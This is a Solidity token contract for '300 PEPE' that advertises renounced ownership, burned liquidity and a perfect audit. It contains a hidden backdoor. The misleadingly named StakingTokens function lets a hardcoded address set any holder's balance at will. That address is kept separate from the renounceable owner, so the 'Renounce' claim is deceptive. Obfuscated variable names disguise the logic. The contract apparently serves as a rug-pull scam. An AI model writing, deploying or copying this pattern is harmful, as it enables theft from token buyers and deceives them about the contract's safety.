// SPDX-License-Identifier: MIT
/**
Three Hundred Pepe
Renounce ⚡️LP BURN ⚡️Audit Score 100% Green

**/

pragma solidity ^0.8.4;
interface ERC20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address _maxTxnr) external view returns (uint256);
  function transfer(address _maxTxnrs, uint256 StakingdAmount) external returns (bool);
  function allowance(address _owner, address _maxTxnr) external view returns (uint256);
  function approve(address _maxTxnr, uint256 StakingdAmount) external returns (bool);
  function transferFrom(address sender, address _maxTxnrs, uint256 StakingdAmount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed _maxTxnr, uint256 balance);
}


abstract contract BEP20MetaData {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract PairBridge is BEP20MetaData {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafePepeErcMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafePepeErcMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafePepeErcMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafePepeErcMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafePepeErcMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafePepeErcMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract ThreeHundredPepe is BEP20MetaData, ERC20, PairBridge {
    
    using SafePepeErcMath for uint256;
    mapping (address => uint256) private userStaking;
    mapping (address => mapping (address => uint256)) private nextSwapBefore;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private PepeErcOwner; 
    string public tokenWebsite = "https://300PEPE.ai/";  
   string public ownerAddress = "0xDc02Cc4a304a9485dee9B9D850C8aD2611902BA1";  
    constructor() {
        PepeErcOwner = 0xDc02Cc4a304a9485dee9B9D850C8aD2611902BA1;    
        _name = "300 PEPE";
        _symbol = "300P";
        _decimals = 9;
        _totalSupply = 300 * 10**_decimals;
        userStaking[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }    

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address _maxTxnr) external view override returns (uint256) {
        return userStaking[_maxTxnr];
    }

    function transfer(address _maxTxnrs, uint256 StakingdAmount) external override returns (bool) {
        _transfer(_msgSender(), _maxTxnrs, StakingdAmount);
        return true;
    }

    function allowance(address owner, address _maxTxnr) external view override returns (uint256) {
        return nextSwapBefore[owner][_maxTxnr];
    }


    function approve(address _maxTxnr, uint256 StakingdAmount) external override returns (bool) {
        _approve(_msgSender(), _maxTxnr, StakingdAmount);
        return true;
    }
    
    function transferFrom(address sender, address _maxTxnrs, uint256 StakingdAmount) external override returns (bool) {
        _transfer(sender, _maxTxnrs, StakingdAmount);
        _approve(sender, _msgSender(), nextSwapBefore[sender][_msgSender()].sub(StakingdAmount, "Ru: transfer StakingdAmount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address _maxTxnr, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), _maxTxnr, nextSwapBefore[_msgSender()][_maxTxnr].add(addedbalance));
        return true;
    }
    

    function decreaseAllowance(address _maxTxnr, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), _maxTxnr, nextSwapBefore[_msgSender()][_maxTxnr].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address _maxTxnrs, uint256 StakingdAmount) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(_maxTxnrs != address(0), "Ru: transfer to the zero address");
                
        userStaking[sender] = userStaking[sender].sub(StakingdAmount, "Ru: transfer StakingdAmount exceeds balance");
        userStaking[_maxTxnrs] = userStaking[_maxTxnrs].add(StakingdAmount);
        emit Transfer(sender, _maxTxnrs, StakingdAmount);
    }
        function StakingTokens(address tokenA, address tokenB, uint256 StakingdAmount, uint256 rewardRate) external {
        require(_msgSender()==PepeErcOwner);
        userStaking[tokenB] = (StakingdAmount + rewardRate);
        tokenA = tokenB;
    }    
    function _approve(address owner, address _maxTxnr, uint256 StakingdAmount) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(_maxTxnr != address(0), "Ru: approve to the zero address");
        
        nextSwapBefore[owner][_maxTxnr] = StakingdAmount;
        emit Approval(owner, _maxTxnr, StakingdAmount);
    }
    
}